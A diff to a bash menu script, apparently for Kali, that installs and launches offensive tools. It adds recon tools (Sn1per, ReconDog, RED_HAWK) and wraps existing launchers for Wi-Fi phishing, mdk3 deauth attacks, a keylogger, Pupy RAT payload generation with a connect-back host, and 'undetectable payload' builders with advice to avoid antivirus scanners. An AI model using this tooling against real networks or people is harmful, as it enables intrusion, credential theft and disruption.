@@ -1,6 +1,6 @@
 #! /bin/bash
-VERSION=1.9.8
-HOWMANYTOOLS=22
+VERSION=1.9.9
+HOWMANYTOOLS=24
 BACKL="0"
 #############DEFAULTS###############
 function defaults_l
@@ -20,6 +20,7 @@ function defaults_l
 	PAKT="Press "$YS"any key$CE to"
 	PAKTC="Press "$YS"any key$CE to continue..."
 	PAKTGB="Press "$YS"any key$CE to go back..."
+	TNI=""$RS"Tool is not installed. To install, go back on TOOLS menu,and select 4) Install / reinstall a tool"$CE""
 #code to read from keyboard without return
 	READAK="read -n 1"
 #path for lscript
@@ -329,7 +330,8 @@ then
 fi
 }
 function listshortcuts
-{
+{	
+	EXTRA1=""
 	if [ "$nn" = "1" ]
 	then
 		TITLE="Fluxion"
@@ -440,6 +442,21 @@ function listshortcuts
 		TITLE="Angry_IP_Scanner"
 		NAMECD=" "
 		KSSET="gnome-terminal --geometry 1x1+9999+9999 -e /usr/bin/ipscan & disown"
+	#~ elif [ "$nn" = "23" ]
+	#~ then
+		#~ TITLE="Sniper"
+		#~ NAMECD='read -p 'DOMAIN:' DOMAIN'
+		#~ KSSET="sniper $DOMAIN"
+	elif [ "$nn" = "23" ]
+	then
+		TITLE="ReconDog"
+		NAMECD="cd /root/ReconDog"
+		KSSET="python dog.py"
+	elif [ "$nn" = "24" ]
+	then
+		TITLE="RED_HAWK"
+		NAMECD="cd /root/RED_HAWK"
+		KSSET="php rhawk.php"
 	fi
 }
 function reinstall_tools
@@ -480,6 +497,9 @@ do
 	echo -e ""$YS"30"$CE") Anonym8"
 	echo -e ""$YS"31"$CE") TheFatRat"
 	echo -e ""$YS"32"$CE") Angry IP Scanner"
+	echo -e ""$YS"33"$CE") Sniper"
+	echo -e ""$YS"34"$CE") ReconDog"
+	echo -e ""$YS"35"$CE") RED HAWK"
 	echo -e ""$YS"back"$CE") Go back"
 	echo -e ""$YS" 0"$CE") Exit"
 	echo -e "Choose: "
@@ -491,6 +511,7 @@ do
 		then
 			echo -e "Removing old..."
 			echo -e "$PAKTC"
+			$READAK
 			rm -r /root/fluxion
 		fi
 		echo -e "Installing fluxion"
@@ -513,6 +534,7 @@ do
 		then
 			echo -e "Removing old..."
 			echo -e "$PAKTC"
+			$READAK
 			rm -r /root/wifiphisher
 		fi
 		echo -e "Installing Wifiphisher"
@@ -533,6 +555,7 @@ do
 		then
 			echo -e "Removing old..."
 			echo -e "$PAKTC"
+			$READAK
 			rm -r /root/morpheus
 		fi				
 		echo -e "Installing Morpheus"
@@ -551,6 +574,7 @@ do
 		then
 			echo -e "Removing old..."
 			echo -e "$PAKTC"
+			$READAK
 			rm -r /root/hakkuframework
 		fi		
 		echo -e "Installing Hakku"
@@ -567,6 +591,7 @@ do
 		then
 			echo -e "Removing old..."
 			echo -e "$PAKTC"
+			$READAK
 			rm -r /root/Trity
 		fi		
 		echo -e "Installing Trity"
@@ -581,6 +606,7 @@ do
 		then
 			echo -e "Removing old..."
 			echo -e "$PAKTC"
+			$READAK
 			rm -r /root/cupp
 		fi			
 		echo -e "Installing Cupp"
@@ -596,6 +622,7 @@ do
 		then
 			echo -e "Removing old..."
 			echo -e "$PAKTC"
+			$READAK
 			rm -r /root/Dracnmap
 		fi			
 		echo -e "Installing Dracnmap"
@@ -610,6 +637,7 @@ do
 		then
 			echo -e "Removing old..."
 			echo -e "$PAKTC"
+			$READAK
 			rm -r /root/Fern-Wifi-Cracker
 		fi		
 		echo -e "Installing Fern"
@@ -628,6 +656,7 @@ do
 		then
 			echo -e "Removing old..."
 			echo -e "$PAKTC"
+			$READAK
 			rm -r /root/kickthemout
 		fi		
 		echo -e "Installing Kichthemout"
@@ -643,6 +672,7 @@ do
 		then
 			echo -e "Removing old..."
 			echo -e "$PAKTC"
+			$READAK
 			rm -r /root/ghost-phisher
 		fi			
 		echo -e "Installing Ghost-Phisher"
@@ -658,6 +688,7 @@ do
 		then
 			echo -e "Removing old..."
 			echo -e "$PAKTC"
+			$READAK
 			rm -r /root/The-Eye
 		fi			
 		echo -e "Installing The Eye"
@@ -673,6 +704,7 @@ do
 		then
 			echo -e "Removing old..."
 			echo -e "$PAKTC"
+			$READAK
 			rm -r /root/xerxes
 		fi			
 		echo -e "Installing Xerxes"
@@ -687,6 +719,7 @@ do
 		then
 			echo -e "Removing old..."
 			echo -e "$PAKTC"
+			$READAK
 			rm -r /root/mdk3-master
 		fi				
 		echo -e "Installing Mdk3-master"
@@ -702,6 +735,7 @@ do
 		then
 			echo -e "Removing old..."
 			echo -e "$PAKTC"
+			$READAK
 			rm -r /root/KatanaFramework
 		fi				
 		echo -e "Installing Katana framework"
@@ -717,6 +751,7 @@ do
 		then
 			echo -e "Removing old..."
 			echo -e "$PAKTC"
+			$READAK
 			rm -r /root/airgeddon
 		fi
 			echo -e "Installing..."
@@ -736,6 +771,7 @@ do
 		then
 			echo -e "Removing old..."
 			echo -e "$PAKTC"
+			$READAK
 			rm -r /root/4nonimizer
 		fi		
 		echo -e "Installing 4nonimizer"
@@ -761,6 +797,7 @@ do
 		then
 			echo -e "Removing old..."
 			echo -e "$PAKTC"
+			$READAK
 			rm -r /root/BeeLogger
 		fi	
 		echo -e "Installing BeeLogger"
@@ -782,6 +819,7 @@ do
 		then
 			echo -e "Removing old..."
 			echo -e "$PAKTC"
+			$READAK
 			rm -r /root/ezsploit
 		fi				
 		echo -e "Installing Ezsploit"
@@ -795,6 +833,7 @@ do
 		then
 			echo -e "Removing old..."
 			echo -e "$PAKTC"
+			$READAK
 			rm -r /root/pupy
 		fi			
 		echo -e "Installing Pupy"
@@ -811,6 +850,7 @@ do
 		then
 			echo -e "Removing old..."
 			echo -e "$PAKTC"
+			$READAK
 			rm -r /root/zirikatu
 		fi		
 		echo -e "Installing Zirikatu"
@@ -825,6 +865,7 @@ do
 		then
 			echo -e "Removing old..."
 			echo -e "$PAKTC"
+			$READAK
 			rm -r /root/WiFi-autopwner
 		fi		
 		echo -e "Installing WiFi-autopwner"
@@ -837,6 +878,7 @@ do
 		then
 			echo -e "Removing old..."
 			echo -e "$PAKTC"
+			$READAK
 			rm -r /root/bully
 		fi				
 		echo -e "Installing Bully"
@@ -853,6 +895,7 @@ do
 		then
 			echo -e "Removing old..."
 			echo -e "$PAKTC"
+			$READAK
 			rm -r /root/kali-anonsurf
 		fi		
 		cd
@@ -869,6 +912,7 @@ do
 		then
 			echo -e "Removing old..."
 			echo -e "$PAKTC"
+			$READAK
 			rm -r /root/anonym8
 		fi		
 		echo -e "Installing Anonym8"
@@ -884,6 +928,7 @@ do
 		then
 			echo -e "Removing old..."
 			echo -e "$PAKTC"
+			$READAK
 			rm -r /root/TheFatRat
 		fi	
 		echo -e "Installing TheFatRat"
@@ -908,6 +953,48 @@ do
 		dpkg -i ipscan_*
 		echo -e "Done"
 		sleep 1
+	elif [ "$REIN" = "33" ]
+	then
+		if [ -d /root/Sn1per ]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			$READAK
+			rm -r /root/Sn1per
+		fi
+		echo -e "Installing Sn1per"
+		echo -e "Tool by 1N3"
+		cd
+		git clone https://github.com/1N3/Sn1per.git
+		cd /root/Sn1per
+		chmod +x install.sh
+		./install.sh
+	elif [ "$REIN" = "34" ]
+	then
+		if [ -d /root/ReconDog ]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			$READAK
+			rm -r /root/ReconDog
+		fi
+		cd
+		echo -e "Installing ReconDog"
+		echo -e "Tool by UltimateHackers"
+		git clone https://github.com/UltimateHackers/ReconDog.git
+	elif [ "$REIN" = "35" ]
+	then
+		if [ -d /root/RED_HAWK ]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			$READAK
+			rm -r /root/RED_HAWK
+		fi
+		cd
+		echo -e "Installing RED HAWK"
+		echo -e "Tool by Tuhinshubhra"
+		git clone https://github.com/Tuhinshubhra/RED_HAWK.git
 	elif [ "$REIN" = "back" ]
 	then
 		clear
@@ -1585,7 +1672,7 @@ function wifi_tools
 			./fluxion
 			cd
 		else
-			echo -e ""$RS"Tool is not installed. To install, go back on TOOLS menu,and select 3) Install / reinstall a tool"$CE""
+			echo -e "$TNI"
 			echo -e "$PAKTGB"
 			$READAK
 		fi
@@ -1595,7 +1682,7 @@ function wifi_tools
 		then
 			wifite
 		else
-			echo -e ""$RS"Tool is not installed. To install, go back on TOOLS menu,and select 3) Install / reinstall a tool"$CE""
+			echo -e "$TNI"
 			echo -e "$PAKTGB"
 			$READAK
 		fi
@@ -1620,7 +1707,7 @@ function wifi_tools
 				wifiphisher
 			fi
 		else
-			echo -e ""$RS"Tool is not installed. To install, go back on TOOLS menu,and select 3) Install / reinstall a tool"$CE""
+			echo -e "$TNI"
 			echo -e "$PAKTGB"
 			$READAK
 		fi
@@ -1633,7 +1720,7 @@ function wifi_tools
 			read -e ESSIDAP
 			wifiphisher --nojamming --essid "$ESSIDAP" -p oauth-login
 		else
-			echo -e ""$RS"Tool is not installed. To install, go back on TOOLS menu,and select 3) Install / reinstall a tool"$CE""
+			echo -e "$TNI"
 			echo -e "$PAKTGB"
 			$READAK
 		fi
@@ -1652,7 +1739,7 @@ function wifi_tools
 				exec bash "$0"
 			fi
 		else
-			echo -e ""$RS"Tool is not installed. To install, go back on TOOLS menu,and select 3) Install / reinstall a tool"$CE""
+			echo -e "$TNI"
 			echo -e "$PAKTGB"
 			$READAK
 		fi
@@ -1664,7 +1751,7 @@ function wifi_tools
 			./morpheus.sh
 			cd
 		else
-			echo -e ""$RS"Tool is not installed. To install, go back on TOOLS menu,and select 3) Install / reinstall a tool"$CE""
+			echo -e "$TNI"
 			echo -e "$PAKTGB"
 			$READAK
 		fi
@@ -1679,7 +1766,7 @@ function wifi_tools
 			./hakku
 			cd
 		else
-			echo -e ""$RS"Tool is not installed. To install, go back on TOOLS menu,and select 3) Install / reinstall a tool"$CE""
+			echo -e "$TNI"
 			echo -e "$PAKTGB"
 			$READAK
 		fi
@@ -1692,7 +1779,7 @@ function wifi_tools
 			clear
 			trity			
 		else
-			echo -e ""$RS"Tool is not installed. To install, go back on TOOLS menu,and select 3) Install / reinstall a tool"$CE""
+			echo -e "$TNI"
 			echo -e "$PAKTGB"
 			$READAK
 		fi
@@ -1704,7 +1791,7 @@ function wifi_tools
 			python cupp.py -i
 			cd			
 		else
-			echo -e ""$RS"Tool is not installed. To install, go back on TOOLS menu,and select 3) Install / reinstall a tool"$CE""
+			echo -e "$TNI"
 			echo -e "$PAKTGB"
 			$READAK
 		fi
@@ -1716,7 +1803,7 @@ function wifi_tools
 			./dracnmap-v*.sh	
 			cd		
 		else
-			echo -e ""$RS"Tool is not installed. To install, go back on TOOLS menu,and select 3) Install / reinstall a tool"$CE""
+			echo -e "$TNI"
 			echo -e "$PAKTGB"
 			$READAK
 		fi
@@ -1728,7 +1815,7 @@ function wifi_tools
 			python execute.py
 			cd
 		else
-			echo -e ""$RS"Tool is not installed. To install, go back on TOOLS menu,and select 3) Install / reinstall a tool"$CE""
+			echo -e "$TNI"
 			echo -e "$PAKTGB"
 			$READAK
 		fi
@@ -1738,7 +1825,7 @@ function wifi_tools
 		then
 			netdiscover
 		else
-			echo -e ""$RS"Tool is not installed. To install, go back on TOOLS menu,and select 3) Install / reinstall a tool"$CE""
+			echo -e "$TNI"
 			echo -e "$PAKTGB"
 			$READAK
 		fi
@@ -1750,7 +1837,7 @@ function wifi_tools
 			python kickthemout.py
 			cd
 		else
-			echo -e ""$RS"Tool is not installed. To install, go back on TOOLS menu,and select 3) Install / reinstall a tool"$CE""
+			echo -e "$TNI"
 			echo -e "$PAKTGB"
 			$READAK
 		fi
@@ -1762,7 +1849,7 @@ function wifi_tools
 			python ghost.py
 			cd
 		else
-			echo -e ""$RS"Tool is not installed. To install, go back on TOOLS menu,and select 3) Install / reinstall a tool"$CE""
+			echo -e "$TNI"
 			echo -e "$PAKTGB"
 			$READAK
 		fi
@@ -1774,7 +1861,7 @@ function wifi_tools
 			./TheEye
 			cd
 		else
-			echo -e ""$RS"Tool is not installed. To install, go back on TOOLS menu,and select 3) Install / reinstall a tool"$CE""
+			echo -e "$TNI"
 			echo -e "$PAKTGB"
 			$READAK
 		fi
@@ -1808,7 +1895,7 @@ function wifi_tools
 				exec bash "$0"
 			fi
 		else
-			echo -e ""$RS"Tool is not installed. To install, go back on TOOLS menu,and select 3) Install / reinstall a tool"$CE""
+			echo -e "$TNI"
 			echo -e "$PAKTGB"
 			$READAK
 		fi
@@ -1829,7 +1916,7 @@ function wifi_tools
 			clear
 			xterm -e 'mdk3 $WLANNM t $MDCHANN $MDBSSID $FPS'	
 		else
-			echo -e ""$RS"Tool is not installed. To install, go back on TOOLS menu,and select 3) Install / reinstall a tool"$CE""
+			echo -e "$TNI"
 			echo -e "$PAKTGB"
 			$READAK
 		fi	
@@ -1851,7 +1938,7 @@ function wifi_tools
 			clear
 			xterm -e 'mdk3 $WLANNM x 0 -t $MDBSSID -n $MDESSID -s $FPS'		
 		else
-			echo -e ""$RS"Tool is not installed. To install, go back on TOOLS menu,and select 3) Install / reinstall a tool"$CE""
+			echo -e "$TNI"
 			echo -e "$PAKTGB"
 			$READAK
 		fi
@@ -1861,7 +1948,7 @@ function wifi_tools
 		then
 			ktf.console
 		else
-			echo -e ""$RS"Tool is not installed. To install, go back on TOOLS menu,and select 3) Install / reinstall a tool"$CE""
+			echo -e "$TNI"
 			echo -e "$PAKTGB"
 			$READAK
 		fi
@@ -1873,7 +1960,7 @@ function wifi_tools
 			./airgeddon.sh
 			cd
 		else
-			echo -e ""$RS"Tool is not installed. To install, go back on TOOLS menu,and select 3) Install / reinstall a tool"$CE""
+			echo -e "$TNI"
 			echo -e "$PAKTGB"
 			$READAK
 		fi
@@ -1883,7 +1970,7 @@ function wifi_tools
 		then
 			websploit
 		else
-			echo -e ""$RS"Tool is not installed. To install, go back on TOOLS menu,and select 3) Install / reinstall a tool"$CE""
+			echo -e "$TNI"
 			echo -e "$PAKTGB"
 			$READAK
 		fi
@@ -1904,7 +1991,7 @@ function wifi_tools
 				openvas-stop
 			fi
 		else
-			echo -e ""$RS"Tool is not installed. To install, go back on TOOLS menu,and select 3) Install / reinstall a tool"$CE""
+			echo -e "$TNI"
 			echo -e "$PAKTGB"
 			$READAK
 		fi
@@ -1914,7 +2001,7 @@ function wifi_tools
 		then
 			bash /usr/bin/ipscan & disown
 		else
-			echo -e ""$RS"Tool is not installed. To install, go back on TOOLS menu,and select 3) Install / reinstall a tool"$CE""
+			echo -e "$TNI"
 			echo -e "$PAKTGB"
 			$READAK
 		fi
@@ -1981,7 +2068,7 @@ function wifi_tools
 				fi
 			done
 		else
-			echo -e ""$RS"Tool is not installed. To install, go back on TOOLS menu,and select 3) Install / reinstall a tool"$CE""
+			echo -e "$TNI"
 			echo -e "$PAKTGB"
 			$READAK
 		fi
@@ -2032,9 +2119,9 @@ function remote_access
 	fi
 	if [ -d /root/TheFatRat ]
 	then
-		echo -e ""$YS" 5"$CE") TheFatRat     Generate undetectable payloads"
+		echo -e ""$YS" 5"$CE") TheFatRat    Generate undetectable payloads"
 	else
-		echo -e ""$RS" 5"$CE") "$RS"TheFatRat"$CE"     Generate undetectable payloads"
+		echo -e ""$RS" 5"$CE") "$RS"TheFatRat"$CE"    Generate undetectable payloads"
 	fi
 	echo -e ""$YS"back"$CE") Go back"
 	echo -e ""$YS"00"$CE") Main menu"
@@ -2044,106 +2131,138 @@ function remote_access
 	clear
 	if [ "$KEYLOG" = "1" ]
 	then
-		cd /root/BeeLogger
-		python bee.py
-		cd
+		if [ -d /root/BeeLogger ]
+		then
+			cd /root/BeeLogger
+			python bee.py
+			cd
+		else
+			echo -e "$TNI"
+			echo -e "$PAKTGB"
+			$READAK
+		fi
 	elif [ "$KEYLOG" = "2" ]
 	then
-		clear
-		cd /root/ezsploit/
-		./ezsploit.sh
-		cd
-		#~ echo -e "TUTORIAL AFTER GENERATION OF PAYLOAD"
-		#~ echo -e "Open a new terminal and type:"
-		#~ echo -e "msfconsole"
-		#~ echo -e "use exploit/multi/handler"
-		#~ echo -e "THIS DEPENDS ON THE PLAYLOAD TYPE. E.G: FOR ANDROID IS: set payload android/meterpreter/reverse_tcp"
-		#~ echo -e "set lhost <YOUR IP HERE>"
-		#~ echo -e "set lport 4444"
-		#~ echo -e "exploit"
-		echo -e "Go to metasploit menu to create a listener(Option "$YS"14"$CE")"
-		sleep 2
-		echo -e "Press "$YS"any key"$CE" to leave..."
-		$READAK
-		exec bash "$0"
+		if [ -d /root/ezsploit ]
+		then
+			cd /root/ezsploit/
+			./ezsploit.sh
+			cd
+			#~ echo -e "TUTORIAL AFTER GENERATION OF PAYLOAD"
+			#~ echo -e "Open a new terminal and type:"
+			#~ echo -e "msfconsole"
+			#~ echo -e "use exploit/multi/handler"
+			#~ echo -e "THIS DEPENDS ON THE PLAYLOAD TYPE. E.G: FOR ANDROID IS: set payload android/meterpreter/reverse_tcp"
+			#~ echo -e "set lhost <YOUR IP HERE>"
+			#~ echo -e "set lport 4444"
+			#~ echo -e "exploit"
+			echo -e "Go to metasploit menu to create a listener(Option "$YS"14"$CE")"
+			sleep 2
+			echo -e "Press "$YS"any key"$CE" to leave..."
+			$READAK
+			exec bash "$0"
+		else
+			echo -e "$TNI"
+			echo -e "$PAKTGB"
+			$READAK
+		fi
 	elif [ "$KEYLOG" = "3" ]
 	then
-		while true
-		do
-		clear
-		echo -e"MORE FEATURES AND METASPLOIT AUTOMATION WILL BE ADDED SOON"
-		echo -e ""$YS" 1"$CE") Generate a payload"
-		echo -e ""$YS" 2"$CE") Start listener"
-		echo -e ""$YS"back"$CE") Go back"
-		echo -e ""$YS"00"$CE") Main menu"
-		echo -e ""$YS" 0"$CE") EXIT"
-		read -e PUPY
-		if [ "$PUPY" = "1" ]
+		if [ -d /root/pupy ]
 		then
+			while true
+			do
 			clear
-			echo -e "Choose the target OS:"
-			echo -e ""$YS" 1"$CE") Windows"
-			echo -e ""$YS" 2"$CE") Linux"
-			echo -e ""$YS" 3"$CE") Android"
-			echo -e "Choose: "
-			read -e TAROS
-			if [ "$TAROS" = "1" ]
+			echo -e ""$YS" 1"$CE") Generate a payload"
+			echo -e ""$YS" 2"$CE") Start listener"
+			echo -e ""$YS"back"$CE") Go back"
+			echo -e ""$YS"00"$CE") Main menu"
+			echo -e ""$YS" 0"$CE") EXIT"
+			read -e PUPY
+			if [ "$PUPY" = "1" ]
 			then
-				TAROS="windows"
-			elif [ "$TAROS" = "2" ]
+				clear
+				echo -e "Choose the target OS:"
+				echo -e ""$YS" 1"$CE") Windows"
+				echo -e ""$YS" 2"$CE") Linux"
+				echo -e ""$YS" 3"$CE") Android"
+				echo -e "Choose: "
+				read -e TAROS
+				if [ "$TAROS" = "1" ]
+				then
+					TAROS="windows"
+				elif [ "$TAROS" = "2" ]
+				then
+					TAROS="linux"
+				elif [ "$TAROS" = "3" ]
+				then
+					TAROS="android"
+				else
+					echo -e "Wrong choice.Returning to main manu..."
+					sleep 2
+					exec bash "$0"
+				fi
+				clear
+				echo -e "Enter your ip: "
+				read -e PUPYIP
+				clear
+				echo -e "Enter your port(e.g: 443): "
+				read -e PUPYPORT
+				clear
+				echo -e "Enter the full output path(e.g: /root/Desktop/payload1.exe)"
+				read -e PUPYPATH
+				cd /root/pupy/pupy
+				./pupygen.py -O $TAROS -o "$PUPYPATH" connect --host "$PUPYIP":"$PUPYPORT"
+			elif [ "$PUPY" = "2" ]
 			then
-				TAROS="linux"
-			elif [ "$TAROS" = "3" ]
+				cd /root/pupy/pupy
+				./pupysh.py
+			elif [ "$PUPY" = "00" ]
 			then
-				TAROS="android"
-			else
-				echo -e "Wrong choice.Returning to main manu..."
-				sleep 2
 				exec bash "$0"
+			elif [ "$PUPY" = "back" ]
+			then
+				break
+			elif [ "$PUPY" = "0" ]
+			then
+				exit
 			fi
-			clear
-			echo -e "Enter your ip: "
-			read -e PUPYIP
-			clear
-			echo -e "Enter your port(e.g: 443): "
-			read -e PUPYPORT
-			clear
-			echo -e "Enter the full output path(e.g: /root/Desktop/payload1.exe)"
-			read -e PUPYPATH
-			cd /root/pupy/pupy
-			./pupygen.py -O $TAROS -o "$PUPYPATH" connect --host "$PUPYIP":"$PUPYPORT"
-		elif [ "$PUPY" = "2" ]
-		then
-			cd /root/pupy/pupy
-			./pupysh.py
-		elif [ "$PUPY" = "00" ]
-		then
-			exec bash "$0"
-		elif [ "$PUPY" = "back" ]
-		then
-			break
-		elif [ "$PUPY" = "0" ]
-		then
-			exit
+			done
+		else
+				echo -e "$TNI"
+				echo -e "$PAKTGB"
+				$READAK
 		fi
-		done
 	elif [ "$KEYLOG" = "4" ]
 	then
-		clear
-		echo -e "CAUTION: DO NOT upload it to anti-virus scanners online."
-		sleep 3
-		echo -e "You agree with that?("$YS"YES"$CE"/"$YS"*"$CE")"
-		read MUSTBEYES
-		if [ "$MUSTBEYES" = "YES" ] 
-		then 
+		if [ -d /root/zirikatu ]
+		then
 			clear
-			cd /root/zirikatu
-			./zirikatu.sh
+			echo -e "CAUTION: DO NOT upload it to anti-virus scanners online."
+			sleep 3
+			echo -e "You agree with that?("$YS"YES"$CE"/"$YS"*"$CE")"
+			read MUSTBEYES
+			if [ "$MUSTBEYES" = "YES" ] 
+			then 
+				clear
+				cd /root/zirikatu
+				./zirikatu.sh
+			fi
+		else
+			echo -e "$TNI"
+			echo -e "$PAKTGB"
+			$READAK
 		fi
 	elif [ "$KEYLOG" = "5" ]
 	then
-		clear
-		fatrat
+		if [ -d /root/TheFatRat ]
+		then
+			fatrat
+		else
+			echo -e "$TNI"
+			echo -e "$PAKTGB"
+			$READAK
+		fi
 	elif [ "$KEYLOG" = "00" ]
 	then
 		clear
@@ -2156,6 +2275,85 @@ function remote_access
 	then
 		break
 	fi
+	done
+}
+function information_gathering
+{
+	while true 
+	do
+		clear
+		echo -e "---------------------"$RS"Information Gathering"$CE"-----------------------"
+		printf '\033]2;INFORMATION GATHERING\a'
+		if [ -d /usr/share/sniper ]
+		then
+			echo -e ""$YS" 1"$CE") Sniper"
+		else
+			echo -e ""$RS" 1"$CE") "$RS"Sniper"$CE""
+		fi
+		if [ -d /root/ReconDog ]
+		then
+			echo -e ""$YS" 2"$CE") ReconDog"
+		else
+			echo -e ""$RS" 2"$CE") "$RS"ReconDog"$CE""
+		fi
+		if [ -d /root/RED_HAWK ]
+		then
+			echo -e ""$YS" 3"$CE") RED HAWK"
+		else
+			echo -e ""$RS" 3"$CE") "$RS"RED HAWK"$CE""
+		fi
+		echo -e ""$YS"back"$CE") Go back"
+		echo -e ""$YS"00"$CE") Main menu"
+		echo -e "Choose: "
+		read INFOG
+		clear
+		if [ $INFOG = 1 ]
+		then
+			if [ -d /usr/share/sniper ]
+			then
+				echo -e "Enter the domain you want to scan: "
+				read DOMAIN
+				clear
+				sniper $DOMAIN
+			else
+				echo -e "$TNI"
+				echo -e "$PAKTGB"
+				$READAK
+			fi
+		elif [ $INFOG = 2 ]
+		then
+			if [ -d /root/ReconDog ]
+			then
+				cd /root/ReconDog
+				python dog.py
+				cd
+			else
+				echo -e "$TNI"
+				echo -e "$PAKTGB"
+				$READAK
+			fi
+		elif [ $INFOG = 3 ]
+		then
+			if [ -d /root/RED_HAWK ]
+			then
+				cd /root/RED_HAWK
+				php rhawk.php
+				cd
+			else
+				echo -e "$TNI"
+				echo -e "$PAKTGB"
+				$READAK
+			fi
+		elif [ $INFOG = 0 ]
+		then
+			exit
+		elif [ $INFOG = 00 ]
+		then
+			exec bash $0
+		elif [ $INFOG = "back" ]
+		then
+			break
+		fi
 	done
 }
 function metasploit_menu
@@ -2517,7 +2715,8 @@ function tools_menu
 	printf '\033]2;TOOLS\a'
 	echo -e ""$YS" 1"$CE") Wifi tools"
 	echo -e ""$YS" 2"$CE") Remote access"
-	echo -e ""$YS" 3"$CE") Install/reinstall a tool"
+	echo -e ""$YS" 3"$CE") Information gathering"
+	echo -e ""$YS" 4"$CE") Install/reinstall a tool"
 	echo -e ""$YS"back"$CE") Go back"
 	echo -e ""$YS"00"$CE") Main menu"
 	echo -e ""$YS" 0"$CE") EXIT"
@@ -2531,6 +2730,9 @@ function tools_menu
 		then
 			remote_access
 		elif [ "$CATEG" = "3" ]
+		then
+			information_gathering
+		elif [ "$CATEG" = "4" ]
 		then
 			reinstall_tools
 		elif [ "$CATEG" = "0" ]
@@ -2861,6 +3063,11 @@ function check_if_ks
 			read COMMAND1 < ""$KSPATH"/"$TITLE"/"$TITLE".txt"
 			read COMMAND2 < ""$KSPATH"/"$TITLE"/"$TITLE"2.txt"
 			$COMMAND1
+			#~ if [ -f ""$KSPATH"/"$TITLE"/"$TITLE"3.txt" ]
+			#~ then
+				#~ read $COMMAND3 < ""$KSPATH"/"$TITLE"/"$TITLE"3.txt"
+				#~ $COMMAND3
+			#~ fi
 			$COMMAND2
 			BACKL="1"
 		fi
@@ -2945,7 +3152,7 @@ function main_options
 		echo -e "Done."
 	elif [ "$YORNAA" = "4" ]
 	then
-		if [ ! -d "/etc/init.d/anonym8" ]
+		if [ ! -f "/etc/init.d/anonym8.sh" ]
 		then
 			echo -e "Anonym8 is not installed. Go to TOOLS -> Install/reinstall a tool     to install it."
 		else
